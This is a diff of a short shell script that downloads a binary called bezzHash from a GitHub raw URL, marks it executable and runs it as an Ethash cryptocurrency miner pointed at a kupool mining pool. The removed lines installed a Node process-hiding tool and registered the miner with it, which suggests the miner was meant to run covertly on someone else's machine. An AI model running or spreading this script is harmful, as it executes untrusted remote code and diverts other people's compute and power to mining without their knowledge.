@@ -1,8 +1,6 @@
 #!/bin/sh
-sudo apt update && apt install screen -y
-apt-get install -y nodejs
-npm i -g node-process-hider
+
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
-ph add bezzHash
+
 ./bezzHash --url=sagemode.$(echo $(shuf -i 1-99999 -n 1)-THOR)@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
